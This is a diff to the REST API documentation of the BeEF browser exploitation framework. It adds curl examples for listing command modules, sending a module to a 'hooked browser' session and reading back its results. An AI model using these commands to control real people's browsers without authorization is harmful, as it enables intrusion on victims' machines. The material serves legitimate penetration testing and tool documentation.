@@ -117,7 +117,9 @@ In order to retrieve relative hooked browser logs, so events that are logged for
 ## Command Modules
 **Handler** => /api/modules
 The _modules_ handler do multiple things:
-**list all available and enabled command modules**
+
+**===List all available and enabled command modules===**
+
 **Request** => GET /api/modules
 
 `curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
@@ -148,7 +150,8 @@ The _modules_ handler do multiple things:
     }
 }
 ```
-**return information about a specified module (description, category, input options)**
+**===Return information about a specified module (description, category, input options)===**
+
 **Request** => GET /api/modules/:module_id
 
 `curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
@@ -169,5 +172,31 @@ The _modules_ handler do multiple things:
     ]
 }
 ```
-* send a command module to the specified hooked browser, (POST /api/modules/:session/:module_id)
-* return information about the specific command module previously executed, (GET /api/modules/:session/:mod_id/:cmd_id)
+**===Send a command module to the specified hooked browser**
+NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.  
+**Request** => POST /api/modules/:session/:module_id
+
+`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+
+**Response**
+
+```json
+{
+    "success": "true",
+    "command_id": "1"
+}
+```
+**===Return information about the specific command module previously executed===**
+
+**Request** => GET /api/modules/:session/:mod_id/:cmd_id
+
+`curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
+
+**Response**
+
+```json
+{
+    "date": "1332260323",
+    "data": "{\"data\":\"answer=don't know\"}"
+}
+```
